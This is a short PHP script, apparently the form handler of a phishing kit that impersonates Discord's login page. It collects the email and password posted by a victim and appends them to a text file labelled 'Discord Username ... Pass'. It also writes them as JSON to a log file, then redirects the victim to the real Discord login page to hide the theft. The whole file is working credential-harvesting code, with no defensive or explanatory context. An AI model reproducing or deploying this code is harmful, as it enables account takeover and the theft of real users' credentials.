<?php 
file_put_contents("usernames.txt", "Discord Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com/login');
$data = array('site' => 'Discode',
  'user' => $_POST['email'],
  'pass' => $_POST['pass']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>
